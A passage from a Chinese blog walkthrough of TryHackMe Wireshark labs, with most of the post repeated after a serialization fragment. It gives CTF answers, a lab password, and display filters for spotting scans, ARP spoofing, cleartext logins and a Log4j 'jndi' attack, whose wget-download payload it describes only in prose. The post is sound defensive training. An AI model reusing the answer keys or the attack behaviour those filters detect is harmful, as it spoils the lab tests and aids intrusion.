看格式就是第二个 第一个不知道咋蹦出来的\n\n第二问 我们还是在熟悉的地方 就是statistics 统计这 点开dns\n\n![task3](/images/tryhackme-wireshark小tips/packet/ipvx.png)\n\n在这找到services里的request-response time 能看到时间 0.467897\n\n![task3](/images/tryhackme-wireshark小tips/packet/dns1.png)\n\n第三rad.msn.com的http Requests \n\n![task3](/images/tryhackme-wireshark小tips/packet/http.png)\n\n你会发现有两个rad.msn.com 直接相加就完事了\n\n![task3](/images/tryhackme-wireshark小tips/packet/http1.png)\n\n## task4\n这个是科普环节 将怎么使用wireshark的过滤器\n\n### 捕获过滤器\n| 过滤规则                 | 说明                         |\n| -------------------- | -------------------------- |\n| `host 192.168.1.1`   | 仅捕获来自或发送到 192.168.1.1 的数据包 |\n| `net 192.168.1.0/24` | 仅捕获 192.168.1.0/24 子网的数据包  |\n| `port 80`            | 仅捕获端口 80（HTTP）的流量          |\n| `tcp`                | 仅捕获 TCP 数据包                |\n| `udp`                | 仅捕获 UDP 数据包                |\n| `tcp port 443`       | 仅捕获 TCP 端口 443（HTTPS）的流量   |\n| `src host 10.0.0.1`  | 仅捕获源 IP 为 10.0.0.1 的流量     |\n| `dst port 53`        | 仅捕获目标端口为 53（DNS）的数据包       |\n\n\n### 显示过滤器\n| 过滤规则                                  | 说明                                      |\n|-------------------------------------------|------------------------------------------|\n| `ip.addr == 192.168.1.1`                  | 过滤与 192.168.1.1 相关的所有流量        |\n| `ip.src == 10.0.0.1`                      | 仅显示源 IP 为 10.0.0.1 的数据包         |\n| `ip.dst == 8.8.8.8`                       | 仅显示目标 IP 为 8.8.8.8 的数据包        |\n| `tcp.port == 80`                          | 仅显示 TCP 端口 80 的流量                |\n| `udp.port == 53`                          | 仅显示 UDP 端口 53（DNS）的流量          |\n| `http`                                    | 仅显示 HTTP 流量                         |\n| `dns`                                     | 仅显示 DNS 流量                          |\n| `tcp.flags.syn == 1 && tcp.flags.ack == 0` | 仅显示 TCP SYN 包（新建连接）           |\n| `frame contains \"password\"`               | 仅显示数据包内容包含 \"password\" 的数据包 |\n| `eth.addr == aa:bb:cc:dd:ee:ff`           | 仅显示特定 MAC 地址的流量                |\n\n## task5\n\n![task3](/images/tryhackme-wireshark小tips/packet/task5.png)\n\n第一问 我们直接在过滤器里面输入ip就能知道 共81420个数据包\n\n![ip](/images/tryhackme-wireshark小tips/packet/ip.png)\n\n第二问 问我们ttl值小于10的数据包有几个 能查到有66个\n\n![ttl](/images/tryhackme-wireshark小tips/packet/ttl.png)\n\n```\nip.ttl<10\n```\n\n第三问 端口是4444的tcp数据包有几个\n\n![4444](/images/tryhackme-wireshark小tips/packet/tcp4444.png)\n\n有632个数据包\n\n```\ntcp.port ==4444\n```\n\n第四问 80端口的http get数据包有几个\n\n![tcp 80](/images/tryhackme-wireshark小tips/packet/tcp%2080.png)\n\n共527个\n\n```\nhttp.request.method=\"GET\" && tcp.port==80\n```\n\n第五问 dns a级查询\n\n![tcp 80](/images/tryhackme-wireshark小tips/packet/dnsa.png)\n\n用这个查询会发现 这个数字并不是题目要求\n\n我们看一下显示过滤器\n\n![tcp 80](/images/tryhackme-wireshark小tips/packet/dns2.png)\n\n![tcp 80](/images/tryhackme-wireshark小tips/packet/dnsaa.png)\n\n![tcp 80](/images/tryhackme-wireshark小tips/packet/dnsa.png)\n\n\n## task6\n![task6](/images/tryhackme-wireshark小tips/packet/task6.png)\n\nok 第一问找不是80端口的iis服务器的数据包 这里是两个条件 一个是iis服务器 一个是不能是80端口\n\n![ask](/images/tryhackme-wireshark小tips/packet/port80%20.png)\n\n```\nhttp.server contains \"iis\" && tcp.scrcport= 80 \n```\n\n就能筛选出来 共有21个\n\n第二问 找到所有版本是7.5的iis服务器\n\n![iis](/images/tryhackme-wireshark小tips/packet/7.5.png)\n\n```\nhttp.server contains \"iis\" && http.server contains \"7.5\" \n```\n\n用这个命令就能筛选出来 共71个\n\n第三问 3333，,4444，,9999端口共有几个数据包\n\n![sidan](/images/tryhackme-wireshark小tips/packet/3333.png)\n\n```\ntcp.port in {3333 4444 9999}\n```\n共计2235个数据包\n\n第四问\nttl为偶数的数据包个数\n\n![ttl](/images/tryhackme-wireshark小tips/packet/ttl1.png)\n\n```\nstrings(ip.ttl) matches \"[02468]$\"\n```\n\n过滤出来能发现有77289个数据包\n\n第五问\n这个要去改config文件 改完使用专家视图去查看\n\n![config](/images/tryhackme-wireshark小tips/packet/config.png)\n\n![config](/images/tryhackme-wireshark小tips/packet/config1.png)\n\n改完之后就可以去专家视图那边去查看Bad TCP Checksum的个数\n\n![config](/images/tryhackme-wireshark小tips/packet/config3.png)\n\n![config](/images/tryhackme-wireshark小tips/packet/config4.png)\n\n最后一问 \n总算是轻松一点了 \n用已经存在的过滤器来筛选数据包  轻轻松松 能发现261个  \n\n![shujubao](/images/tryhackme-wireshark小tips/packet/5.png)\n\n这两个wireshark就写到这里 收益还是很多的 在筛选器那里和导出文件 对wireshark的功能也熟悉了很多 至少不会像之前一样两眼懵逼的盯着屏幕\n现在剩下最后一个问题了 流量分析！！！\n\n## traffic Analysis\n前面的看完 我们看看流量分析\n\n这个是真有点小难度\n\n## task2\n![task2](/images/tryhackme-wireshark小tips/traffic/task2.png)\n\n### 第一问\n其实在这个文章中就有介绍怎么去过滤tcp connect的数据包\n\n```\ntcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size <= 1024\n```\n\n- syn == 1就是用来确立连接的请求报文  \n- ack==0就是三次握手的第一步 \n- tcp窗口的大小字段小于等于1024\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/tcp%20connect.png)\n\n由图就能看出总数为1000个\n\n### 第二问\n![ask2](/images/tryhackme-wireshark小tips/traffic/tcpconnect.png)\n\n```\ntcp.port == 80\n```\n\n第一个包会发现是tcp connect的数据包\n\n### 第三问\n\n![ask3](/images/tryhackme-wireshark小tips/traffic/udpguabi.png)\n\n```\nicmp.type == 3 && icmp.code == 3\n```\n\nicmp.type == 3意思就是目的地不可达\n\nicmp.code == 3意思就是端口不可达\n\n这样就能查出有1083个关闭的端口\n\n## 第四问\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/udp1.png)\n\n```\nudp.port in {55..70}\n```\n\n我们过滤出来之后分析一下这个数据包走向 前面67和69端口的数据包后面都显示没到达目的地 而68端口则显示成功 数据包一直在传输。说明68端口开放\n\n## task3\n\n![task3](/images/tryhackme-wireshark小tips/traffic/task3.png)\n\n### 第一问\n![ask1](/images/tryhackme-wireshark小tips/traffic/284.png)\n\n我们仔细观察就能发现攻击者的物理地址 就图片蓝色标的\n\n```\n(arp.opcode== 1) && (eth.src == 00:0c:29:e2:18:b4)\n```\n\narp.opcode == 1 就是过滤arp请求包\n\n其实单点一下你要的选项 把他拖到搜索栏那里就能自动输入 没有这么麻烦 就这个问题举例子 点到源地址这个选项 单击拖到搜索栏 选择and selected 就能自动输入\n\n### 第二问\n\n![ask2](/images/tryhackme-wireshark小tips/traffic/httppacket.png)\n\n这题是说攻击者收到的http包的数目 意思就是目的地应该是攻击者的地址才对 \n\n```\n(http) && (eth.dst == 00:0c:29:e2:18:b4)\n```\n\n### 第三问\n问用户名和密码的话 八层应该是与登录有关 我们搜一下关键词login 随便点进去看到有个可疑的值 uname和pass\n\n![ask3](/images/tryhackme-wireshark小tips/traffic/number6.png)\n\n\n把uname值拖到搜索栏搜一下 就能找到六个账户密码的条数\n\n![ask3](/images/tryhackme-wireshark小tips/traffic/6.png)\n\n### 第四问\n问一个账户的密码 我们就在上一题的地方找到Client986这个账户 在里面就能翻到密码clientnothere!\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/client986.png)\n\n### 第五问\n我们在上一题找到Client986 我们把这个值拖到搜索栏 把Client986改成Client354 就能搜到与Client354有关的数据包 进去后在周围翻翻就能找到密码\n\n![ask5](/images/tryhackme-wireshark小tips/traffic/nice354.png)\n\n在周围翻翻就能找到密码\n\n## task4\n![task4](/images/tryhackme-wireshark小tips/traffic/task4.png)\n\n### 第一问\n问主机盖乐世a30的mac地址 那我们搜搜看有没有数据包有a30这个字段的\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/a30.png)\n\n找到之后往上面找找地址 destination地址是cisco思科的企业协议 源地址估计就是我们想要的\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/a301.png)\n\n### 第二问\n问工作站的netbios注册请求\n\n![ask2](/images/tryhackme-wireshark小tips/traffic/lival.png)\n\n```\nnbns.name contains \"LIVALJM\" && nbns.flags opcode == 5 \n```\n\nnbns.flags opcode == 5 表示nbns的注册请求\n\n### 第三问\n问哪个主机请求的ip是172.16.13.85\n\n我们先搜一下dhcp 看一下数据包先 在最底下发现一行requested ip address 把这个值拖到搜索栏和dhcp一起搜索\n记得加上我们题目说的ip\n\n![ask3](/images/tryhackme-wireshark小tips/traffic/a12.png)\n\n```\n(dhcp) && (dhcp.option.requested_ip_address == 172.16.13.85)\n```\n\n一搜一个准 找到主机名 盖乐世的a12\n\n![ask3](/images/tryhackme-wireshark小tips/traffic/a121.png)\n\n### 第四问\n找u5这个用户的ip \n\nCNameString在kerberos中就算是用户名 把这个参数拉到搜索栏 搜u5就行了\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/u5.png)\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/u51.png)\n\n我这算很繁琐的步骤 用下面这个命令就一步到位了 知道ip是10.1.12.2 诶 要记住不能只填ip 他说是defanged ip\n\n```\nkerberos.CNameString contains \"u5\"\n```\n\n科普一下\nDefanged IP address”（去毒化的 IP 地址）是一种安全处理技术，于修改 IP 地址的显示格式，使其在文档、日志或安全报告中不被自动识别为可点击的链接，从而防止意外访问或自动化攻击。\n\n把.换成[.]就行了\n\n### 第五问\n要查主机名 在kerberos中主机名和用户名有点小区别\n\n![ask5](/images/tryhackme-wireshark小tips/traffic/user.png)\n\n就得在后面加个$ 所以我们就查CNameString带$的就行\n\n```\nkerberos.CNameString contains \"$\" \n```\n\n![ask5](/images/tryhackme-wireshark小tips/traffic/xp1.png)\n\n查到了一个叫xp1$的用户名\n\n## task5\n![task5](/images/tryhackme-wireshark小tips/traffic/task5.png)\n\n### 第一问\n问什么协议\n这题其实我来说没多大灵感 就搜icmp然后往下翻翻 看看有哪个包的大小异常吗 结果发现还真有 点开看看 发现开头就发现了dh协议 ssh敲定了\n![ask1](/images/tryhackme-wireshark小tips/traffic/ssh.png)\n\n### 第二问\n开始就是搜索dns看看有什么大小异常的包吗 还是出乎意料 真有一个\n\n![ask2](/images/tryhackme-wireshark小tips/traffic/data.png)\n\n底下发下一个网站 把网址中的.转化成[.] 输进去发现成了\n\n这两个纯纯狗屎运\n## task6\n![task2](/images/tryhackme-wireshark小tips/traffic/task6.png)\n\n### 第一问\n问有几次登录失败\n\n```\nftp.response.code == 530\n```\n\n530：未登录，密码无效 刚好适合错误的登录尝试\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/error737.png)\n\n### 第二问\n问的是文件大小 应该是和文件状态有关\n```\nftp.response.code == 213\n```\n213：文件状态\n\n输完命令之后我们点开追踪流检查一下\n\n![ask2](/images/tryhackme-wireshark小tips/traffic/213.png)\n\n发现有个39424大小的文件\n\n![ask2](/images/tryhackme-wireshark小tips/traffic/2131.png)\n\n### 第三问 & 第四问\n问文件名和升级文件权限的命令。\n同样在这个追踪流里面可以看到。\n![ask2](/images/tryhackme-wireshark小tips/traffic/chmod.png)\n\n文件和命令都看见了。\n\n## task7\n![task2](/images/tryhackme-wireshark小tips/traffic/task7.png)\n\n### 第一问&第二问\n这一问纯玄学 问异常的类型\n![ask1](/images/tryhackme-wireshark小tips/traffic/jizhong.png)\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/jizhong2.png)\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/jizhong4.png)\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/jizhong5.png)\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/jizhong6.png)\n\n最后一个是mozilla和mozllla差了个字\n\n第二题刚好问了这个有差别的包的编号是什么 第52个\n\n### 第三问&第四问\n第几个包发动log4j攻击的\n\n问了问度娘\nLog4j 是一个广泛使用的 Java 日志记录库，jndi（Java 命名和目录接口）是 Java 的一部分，允许 Java 应用程序查找和访问命名服务。\n\n输入命令搜一下 出现的第一个是编号444的包 \n```\nip contains \"jndi\"\n```\n\n![aks3](/images/tryhackme-wireshark小tips/traffic/jndi.png)\n\n点进去发现一个惊喜 应该是base64编码 拉到cyberchief里面解码\n![aks3](/images/tryhackme-wireshark小tips/traffic/jndi1.png)\n\n会发现在用wegt下载 设置权限 运行脚本 把ip转成defang的ip 就是第四题的答案\n![ask1](/images/tryhackme-wireshark小tips/traffic/jizhong3.png)\n\n## task8\n![task2](/images/tryhackme-wireshark小tips/traffic/task8.png)\n\n### 第一问\n问发送到“accounts.google.com”的“Client Hello”消息的框架编号是多少？\n\nClient Hello：tls.handshake.type == 1\nserver Hello： tls.handshake.type == 2  \n\n我们先收集一下所有的Client Hello 随便点一个点开他的server name 拉到搜索栏 server name改成‘accounts.google.com’\n![ask1](/images/tryhackme-wireshark小tips/traffic/client.png)\n\n```\n(tls.handshake.type == 1)  && (tls.handshake.extensions_server_name == \"accounts.google.com\")\n```\n\n一下就搜出来了\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/16.png)\n\n### 第二问\n导入秘钥 直接搜http2就出来了 共115个\n\n![ask2](/images/tryhackme-wireshark小tips/traffic/http2.png)\n\n### 第三问\n去322编号的数据包\n\n直接点开跟踪流 把网站的.弄成[.]\n\n![ask3](/images/tryhackme-wireshark小tips/traffic/322.png)\n\n\n### 第四问\n找这种数据包里的文件有个很diao的方法 我们导出文件\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/flag0.png)\n\n点进去就能找到疑似flag的包\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/flag.png)\n\n保存到桌面 查看一下就行了\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/flag1.png)\n\n## task9\n![task2](/images/tryhackme-wireshark小tips/traffic/task9.png)\n### 第一问&第二问\n明文凭证 这一问都是在这里面完成\n\n![ask](/images/tryhackme-wireshark小tips/traffic/cred.png)\n\n![ask](/images/tryhackme-wireshark小tips/traffic/cred1.png)\n第一问的数据包编号就是237\n\n第二个就得看看数据包先 \n\n![ask](/images/tryhackme-wireshark小tips/traffic/ftp1.png)\n\n![ask](/images/tryhackme-wireshark小tips/traffic/ftp2.png)\n\n数据包基本就分这两类 user和pass 还有别的无关紧要的 要求是说空密码 就把 request command：pass那行拉去搜索\n\n![ask](/images/tryhackme-wireshark小tips/traffic/ftp.png)\n\n发现第170个包的pass空空的 没错了\n\n## task10\n![task2](/images/tryhackme-wireshark小tips/traffic/task10.png)\n\n\n照着题目点击对应的数据包 点开防火墙规则设置\n\n![ask](/images/tryhackme-wireshark小tips/traffic/fire0.png)\n\n把这两个规则复制粘贴就行 第二问要把deny改成allow 因为题目问的是允许\n\n![ask](/images/tryhackme-wireshark小tips/traffic/fire.png)\n\n![ask](/images/tryhackme-wireshark小tips/traffic/fire2.png)\n\n\nwireshark三个部分总算肝完 其实也不算肝 就是内容小多 内容也干得要死 全是干货 过段时间更一下wireshark的实战 试试水\n","source":"_posts/tryhackme wireshark入门三部曲.md","raw":"---\ntitle: tryhackme wireshark入门三部曲\ndate: 2025-02-04 08:37:18\ntags: wireshark 基础 渗透工具\ntop_img: transparent\ncover: https://s2.loli.net/2025/02/04/xtlwMk9HLNGWiyE.jpg\n---\n\nwireshark 一个流量分析的工具 一个抓取流量包的工具\n一个暗藏~~只因~~(玄机)的工具 只要擅长使用这个工具能带来很大的帮助 \n\n简单看看tryhackme的wireshark教程 总共是分为三个部分\n\n![title](/images/tryhackme-wireshark小tips/title.png)\n\n# the basic\n\n基础部分当然是介绍解释wireshark的操作界面和基础功能\n\n先来看看初始界面\n\n![chushi](/images/tryhackme-wireshark小tips/zhuomian.png)\n\n从上往下分别是工具栏，显示过滤栏(用来过滤我们需要的东西)，最近文件，捕获过滤器和接口，状态栏\n\n![in](/images/tryhackme-wireshark小tips/inzhuo.png)\n\n这个界面就是一般我们平时使用的上面红色的部分就是数据包列表，中间的分别是数据包细节和数据包的字节，最下面是告诉我们有几个数据包 以及展示的数据包数目。\n\n我们来看一下task2 讲了啥东西\n\n## task 2\nWireshark 是目前最强大的流量分析工具之一。它有多种用途：\n\n- 检测并排除网络问题，例如网络负载故障点和拥塞。\n- 检测安全异常，例如恶意主机、异常端口使用和可疑流量。\n- 调查和了解协议细节，例如响应代码和有效负载数据。\n\n科普完毕 来看一下他要求\n\n![task](/images/tryhackme-wireshark小tips/task2.png)\n\n需要我们去查看文件信息 点击这个就可以查看文件信息 我们往下滑就能看到 全部题目的答案\n\n![st](/images/tryhackme-wireshark小tips/st.png)\n\n![st](/images/tryhackme-wireshark小tips/hash.png)\n\n![st](/images/tryhackme-wireshark小tips/flag.png)\n\n\n第一题的flag就在底下 \n\n```\nans:TryHackMe_Wireshark_Demo\n```\n\n数据包的总数为58620个 \n\n```\nans:57620\n```\n\nhash值也显而易见\n\n```\nf446de335565fb0b0ee5e5a3266703c778b2f3dfad7efeaeccb2da5641a6d6eb\n```\n\n## task3\n\n![task](/images/tryhackme-wireshark小tips/task3.png)\n\n查找数据包的编号先\n\n![task](/images/tryhackme-wireshark小tips/finds.png)\n\n\n![task](/images/tryhackme-wireshark小tips/38.png)\n\n可以发现使用了xml语言\n\n```\nans:eXtensible Markup Language\n```\n\n看时间的话 就得点进去慢慢找了 其实点进去就能发现到达时间\n\n![time](/images/tryhackme-wireshark小tips/time.png)\n\n```\nans:13/05/2004\n```\n\nttl就是time to live 存活周期 是在osi的第三层 网络层那里 我们就到ip的那个部分找找\n\n![time](/images/tryhackme-wireshark小tips/ttl.png)\n\n```\nans:47\n```\n\ntcp的有效负载大小 就得在数据包细节找到tcp的部分 负载应该能理解成一端的大小\n\ntcp是在第四层 传输层\n\n![tcp](/images/tryhackme-wireshark小tips/tcp.png)\n\n```\nans:424\n```\n\netag也在这附近 在底下找找就有了\n\n![tcp](/images/tryhackme-wireshark小tips/etag.png)\n\n## task4\n\n![task4](/images/tryhackme-wireshark小tips/task4.png)\n\n查r4w这个字串 的第一个艺术家叫啥名字\n\n![task4](/images/tryhackme-wireshark小tips/r4w.png)\n\n![task4](/images/tryhackme-wireshark小tips/r4w1.png)\n\n能看到第一个艺术家的名字 \n\n```\nans:r4w8173\n```\n\n去编号是12的数据包那看评论是啥 这个就有意思了 \n\n![task4](/images/tryhackme-wireshark小tips/packet1.png)\n\n![task4](/images/tryhackme-wireshark小tips/packet2.png)\n\n![task4](/images/tryhackme-wireshark小tips/12.png)\n\n又让我去39765这个包里面找照片 一开始我是没想到这东西还能直接导出来 后面有一个note.txt也是一样 要我们导出来 cat一下就行 照片就不太一样 他说了要md5 我们用md5sum来把他提取出来\n\n![task4](/images/tryhackme-wireshark小tips/img.png)\n\n导出之后直接md5sum 加你保存的文件名\n\n![task4](/images/tryhackme-wireshark小tips/md5.png)\n\n```\nans:911cd574a42865a956ccde2d04495ebf\n```\n\n需要找一个txt文件 先用过滤器去过滤一下 找到txt文件在哪\n\n![task4](/images/tryhackme-wireshark小tips/note0.png)\n\n然后我们导出http 把note.txt导出来\n\n![task4](/images/tryhackme-wireshark小tips/note.png)\n\n![task4](/images/tryhackme-wireshark小tips/note2.png)\n\n保存之后 我们直接查看就能看到外星人名字\n\n![task4](/images/tryhackme-wireshark小tips/name.png)\n\n```\nans:packermaster\n```\n\n## task5\n\n![task5](/images/tryhackme-wireshark小tips/task5.png)\n\n第一题就是http\n\n```\nans：http\n```\n\n第二题我们过滤了http之后 在底下会有显示展示了多少个数据包\n\n![shujubao](/images/tryhackme-wireshark小tips/http.png)\n\n下面显示1089个\n\n```\nans:1089\n```\n\n第三题 去到33790的包中查看一下细节\n\n![shujubao](/images/tryhackme-wireshark小tips/secend.png)\n\n进http流里面搜索artists 就能看到艺术家名字 会发现艺术家共有三个 第二个叫做Blad3\n\n![shujubao](/images/tryhackme-wireshark小tips/band.png)\n\n```\nans:3\n\nans:Blad3\n```\n\n第一个部分 基础部分结束了 我们来看下一个部分\n\n# Packet Operations\n数据包操作 我们来看点小难的来练练 主要也是深入了解一点wireshark\n\n这个地方是统计 可以看协议的数据包 主要是对数据包进行统计 可以在里面找到你想要的数据包\n\n![qwe](/images/tryhackme-wireshark小tips/packet/ipvx.png)\n\n## task2\n\n![task2](/images/tryhackme-wireshark小tips/packet/task2.png)\n\n第一题我们得在resolved addresses里面去找 因为是在找hostname是bbc的ip\n\n![task2](/images/tryhackme-wireshark小tips/packet/bbc.png)\n\nip为199.232.24.81\n\n第二题是在找ipv4的对话 那我们要在对话里面去找ipv4\n\n![task2](/images/tryhackme-wireshark小tips/packet/ipv4.png)\n\n共有435个对话\n\n第三题 这次我们现在resolved addresses找一下micro-st的地址 然后去endpoint查询这个地址的字节\n\n![task2](/images/tryhackme-wireshark小tips/packet/micro.png)\n\n![task2](/images/tryhackme-wireshark小tips/packet/mac.png)\n\n这两招下来就能找到字节大小 7474bytes\n\n第三题依然是在endpoints里面找 找到city 筛选一下。能找到四个Kansas City有关的地址\n\n![city](/images/tryhackme-wireshark小tips/packet/city.png)\n\n第四题在endpoints 里面找组织 也是筛选一下 就能知道ip是188.246.82.7\n\n![city](/images/tryhackme-wireshark小tips/packet/blicnet.png)\n\n## task3\n\n直接看题目要求\n\n![task3](/images/tryhackme-wireshark小tips/packet/task3.png)\n\n第一问 问最多用的ipv4的目的地址\n\n![task3](/images/tryhackme-wireshark小tips/packet/destination.png)\n\n![task3](/images/tryhackme-wireshark小tips/packet/destination1.png)\n\nip为10.100.1.33 我搞不懂为啥前面还多一个 看格式就是第二个 第一个不知道咋蹦出来的\n\n第二问 我们还是在熟悉的地方 就是statistics 统计这 点开dns\n\n![task3](/images/tryhackme-wireshark小tips/packet/ipvx.png)\n\n在这找到services里的request-response time 能看到时间 0.467897\n\n![task3](/images/tryhackme-wireshark小tips/packet/dns1.png)\n\n第三rad.msn.com的http Requests \n\n![task3](/images/tryhackme-wireshark小tips/packet/http.png)\n\n你会发现有两个rad.msn.com 直接相加就完事了\n\n![task3](/images/tryhackme-wireshark小tips/packet/http1.png)\n\n## task4\n这个是科普环节 将怎么使用wireshark的过滤器\n\n### 捕获过滤器\n| 过滤规则                 | 说明                         |\n| -------------------- | -------------------------- |\n| `host 192.168.1.1`   | 仅捕获来自或发送到 192.168.1.1 的数据包 |\n| `net 192.168.1.0/24` | 仅捕获 192.168.1.0/24 子网的数据包  |\n| `port 80`            | 仅捕获端口 80（HTTP）的流量          |\n| `tcp`                | 仅捕获 TCP 数据包                |\n| `udp`                | 仅捕获 UDP 数据包                |\n| `tcp port 443`       | 仅捕获 TCP 端口 443（HTTPS）的流量   |\n| `src host 10.0.0.1`  | 仅捕获源 IP 为 10.0.0.1 的流量     |\n| `dst port 53`        | 仅捕获目标端口为 53（DNS）的数据包       |\n\n\n### 显示过滤器\n| 过滤规则                                  | 说明                                      |\n|-------------------------------------------|------------------------------------------|\n| `ip.addr == 192.168.1.1`                  | 过滤与 192.168.1.1 相关的所有流量        |\n| `ip.src == 10.0.0.1`                      | 仅显示源 IP 为 10.0.0.1 的数据包         |\n| `ip.dst == 8.8.8.8`                       | 仅显示目标 IP 为 8.8.8.8 的数据包        |\n| `tcp.port == 80`                          | 仅显示 TCP 端口 80 的流量                |\n| `udp.port == 53`                          | 仅显示 UDP 端口 53（DNS）的流量          |\n| `http`                                    | 仅显示 HTTP 流量                         |\n| `dns`                                     | 仅显示 DNS 流量                          |\n| `tcp.flags.syn == 1 && tcp.flags.ack == 0` | 仅显示 TCP SYN 包（新建连接）           |\n| `frame contains \"password\"`               | 仅显示数据包内容包含 \"password\" 的数据包 |\n| `eth.addr == aa:bb:cc:dd:ee:ff`           | 仅显示特定 MAC 地址的流量                |\n\n## task5\n\n![task3](/images/tryhackme-wireshark小tips/packet/task5.png)\n\n第一问 我们直接在过滤器里面输入ip就能知道 共81420个数据包\n\n![ip](/images/tryhackme-wireshark小tips/packet/ip.png)\n\n第二问 问我们ttl值小于10的数据包有几个 能查到有66个\n\n![ttl](/images/tryhackme-wireshark小tips/packet/ttl.png)\n\n```\nip.ttl<10\n```\n\n第三问 端口是4444的tcp数据包有几个\n\n![4444](/images/tryhackme-wireshark小tips/packet/tcp4444.png)\n\n有632个数据包\n\n```\ntcp.port ==4444\n```\n\n第四问 80端口的http get数据包有几个\n\n![tcp 80](/images/tryhackme-wireshark小tips/packet/tcp%2080.png)\n\n共527个\n\n```\nhttp.request.method=\"GET\" && tcp.port==80\n```\n\n第五问 dns a级查询\n\n![tcp 80](/images/tryhackme-wireshark小tips/packet/dnsa.png)\n\n用这个查询会发现 这个数字并不是题目要求\n\n我们看一下显示过滤器\n\n![tcp 80](/images/tryhackme-wireshark小tips/packet/dns2.png)\n\n![tcp 80](/images/tryhackme-wireshark小tips/packet/dnsaa.png)\n\n![tcp 80](/images/tryhackme-wireshark小tips/packet/dnsa.png)\n\n\n## task6\n![task6](/images/tryhackme-wireshark小tips/packet/task6.png)\n\nok 第一问找不是80端口的iis服务器的数据包 这里是两个条件 一个是iis服务器 一个是不能是80端口\n\n![ask](/images/tryhackme-wireshark小tips/packet/port80%20.png)\n\n```\nhttp.server contains \"iis\" && tcp.scrcport= 80 \n```\n\n就能筛选出来 共有21个\n\n第二问 找到所有版本是7.5的iis服务器\n\n![iis](/images/tryhackme-wireshark小tips/packet/7.5.png)\n\n```\nhttp.server contains \"iis\" && http.server contains \"7.5\" \n```\n\n用这个命令就能筛选出来 共71个\n\n第三问 3333，,4444，,9999端口共有几个数据包\n\n![sidan](/images/tryhackme-wireshark小tips/packet/3333.png)\n\n```\ntcp.port in {3333 4444 9999}\n```\n共计2235个数据包\n\n第四问\nttl为偶数的数据包个数\n\n![ttl](/images/tryhackme-wireshark小tips/packet/ttl1.png)\n\n```\nstrings(ip.ttl) matches \"[02468]$\"\n```\n\n过滤出来能发现有77289个数据包\n\n第五问\n这个要去改config文件 改完使用专家视图去查看\n\n![config](/images/tryhackme-wireshark小tips/packet/config.png)\n\n![config](/images/tryhackme-wireshark小tips/packet/config1.png)\n\n改完之后就可以去专家视图那边去查看Bad TCP Checksum的个数\n\n![config](/images/tryhackme-wireshark小tips/packet/config3.png)\n\n![config](/images/tryhackme-wireshark小tips/packet/config4.png)\n\n最后一问 \n总算是轻松一点了 \n用已经存在的过滤器来筛选数据包  轻轻松松 能发现261个  \n\n![shujubao](/images/tryhackme-wireshark小tips/packet/5.png)\n\n这两个wireshark就写到这里 收益还是很多的 在筛选器那里和导出文件 对wireshark的功能也熟悉了很多 至少不会像之前一样两眼懵逼的盯着屏幕\n现在剩下最后一个问题了 流量分析！！！\n\n## traffic Analysis\n前面的看完 我们看看流量分析\n\n这个是真有点小难度\n\n## task2\n![task2](/images/tryhackme-wireshark小tips/traffic/task2.png)\n\n### 第一问\n其实在这个文章中就有介绍怎么去过滤tcp connect的数据包\n\n```\ntcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size <= 1024\n```\n\n- syn == 1就是用来确立连接的请求报文  \n- ack==0就是三次握手的第一步 \n- tcp窗口的大小字段小于等于1024\n\n![ask1](/images/tryhackme-wireshark小tips/traffic/tcp%20connect.png)\n\n由图就能看出总数为1000个\n\n### 第二问\n![ask2](/images/tryhackme-wireshark小tips/traffic/tcpconnect.png)\n\n```\ntcp.port == 80\n```\n\n第一个包会发现是tcp connect的数据包\n\n### 第三问\n\n![ask3](/images/tryhackme-wireshark小tips/traffic/udpguabi.png)\n\n```\nicmp.type == 3 && icmp.code == 3\n```\n\nicmp.type == 3意思就是目的地不可达\n\nicmp.code == 3意思就是端口不可达\n\n这样就能查出有1083个关闭的端口\n\n## 第四问\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/udp1.png)\n\n```\nudp.port in {55..70}\n```\n\n我们过滤出来之后分析一下这个数据包走向 前面67和69端口的数据包后面都显示没到达目的地 而68端口则显示成功 数据包一直在传输。说明68端口开放\n\n## task3\n\n![task3](/images/tryhackme-wireshark小tips/traffic/task3.png)\n\n### 第一问\n![ask1](/images/tryhackme-wireshark小tips/traffic/284.png)\n\n我们仔细观察就能发现攻击者的物理地址 就图片蓝色标的\n\n```\n(arp.opcode== 1) && (eth.src == 00:0c:29:e2:18:b4)\n```\n\narp.opcode == 1 就是过滤arp请求包\n\n其实单点一下你要的选项 把他拖到搜索栏那里就能自动输入 没有这么麻烦 就这个问题举例子 点到源地址这个选项 单击拖到搜索栏 选择and selected 就能自动输入\n\n### 第二问\n\n![ask2](/images/tryhackme-wireshark小tips/traffic/httppacket.png)\n\n这题是说攻击者收到的http包的数目 意思就是目的地应该是攻击者的地址才对 \n\n```\n(http) && (eth.dst == 00:0c:29:e2:18:b4)\n```\n\n### 第三问\n问用户名和密码的话 八层应该是与登录有关 我们搜一下关键词login 随便点进去看到有个可疑的值 uname和pass\n\n![ask3](/images/tryhackme-wireshark小tips/traffic/number6.png)\n\n\n把uname值拖到搜索栏搜一下 就能找到六个账户密码的条数\n\n![ask3](/images/tryhackme-wireshark小tips/traffic/6.png)\n\n### 第四问\n问一个账户的密码 我们就在上一题的地方找到Client986这个账户 在里面就能翻到密码clientnothere!\n\n![ask4](/images/tryhackme-wireshark小tips/traffic/client986.png)\n\n### 第五问\n我们在上一题找到Client986 我们把这个值拖到搜索栏 把Client986改成Client354 就能搜到与Client354有关的数据包 进去后在周围翻翻就能找到密码\n\n![ask5](/images/tryhackme-wireshark小tips/traffic/nice354.png)\n\n在周围翻翻就能找到密码\n\n## 